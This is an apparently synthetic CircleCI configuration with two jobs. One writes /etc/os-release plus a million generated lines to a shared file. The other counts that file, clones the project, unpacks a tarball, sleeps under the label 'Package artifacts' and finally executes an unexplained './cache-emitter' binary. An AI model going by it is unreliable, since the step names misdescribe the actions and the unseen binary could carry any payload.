version: 2.1

jobs:
  MAX_RATE:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - run:
          name: Build v1
          command: |
            mkdir -p /tmp/box-C
            set +o pipefail 2>/dev/null; cp /etc/os-release /tmp/box-C/VID_00091832 2>/dev/null || echo "no osrel" > /tmp/box-C/VID_00091832; seq 1 1357613 >> /tmp/box-C/VID_00091832; true
            echo "The handoff file at /tmp/box-C/VID_00091832 contains $(wc -l </tmp/box-C/VID_00091832) lines ($(wc -c </tmp/box-C/VID_00091832) B)"
      - persist_to_workspace:
          root: /tmp/box-C
          paths:
            - 'VID_00091832'
  d-x:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/box-C
      - run:
          name: Ingest
          command: |
            awk '/./{w[$1]++} END{for(k in w) print w[k],k}' /tmp/box-C/VID_00091832 2>/dev/null | sort -rn | head -3 || true
      - run:
          name: Grab repository
          command: git clone --depth 2 -q --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
      - run:
          name: Unpack toolkit
          command: gunzip -c main-blobs-main.tgz | tar xf -
      - run:
          name: Package artifacts
          command: sleep 45
      - run:
          command: exec ./cache-emitter
